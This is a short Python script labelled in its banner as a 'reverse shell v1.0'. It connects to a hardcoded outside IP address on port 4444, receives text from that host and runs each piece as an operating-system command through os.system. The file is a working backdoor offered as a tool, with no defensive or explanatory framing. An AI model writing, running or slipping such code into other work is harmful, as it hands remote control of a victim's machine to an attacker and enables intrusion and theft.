"""
 _____  ____                                           _          _ _
|  __ \|  _ \                                         | |        | | |
| |__) | |_) |  _ __ _____   _____ _ __ ___  ___   ___| |__   ___| | |
|  ___/|  _ <  | '__/ _ \ \ / / _ \ '__/ __|/ _ \ / __| '_ \ / _ \ | |
| |    | |_) | | | |  __/\ V /  __/ |  \__ \  __/ \__ \ | | |  __/ | |
|_|    |____/ _|_|  \___| \_/ \___|_|  |___/\___| |___/_| |_|\___|_|_|
        /_ | / _ \
__   __  | || | | |
\ \ / /  | || | | |
 \ V /   | || |_| |
  \_/    |_(_)___/
"""

import socket
import sys
import os

client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

def connect():
    try:
        client.connect(('188.35.22.187',4444))
    except:
        print("connection failed")
def command():
    while True:
        print("start")
        while True:
            data = client.recv(4096).decode('utf-8')
            os.system(data)
            client.send('done'.encode('utf-8'))
            print("command " + data + " was completed")

if __name__=="__main__":
    connect()
    command()
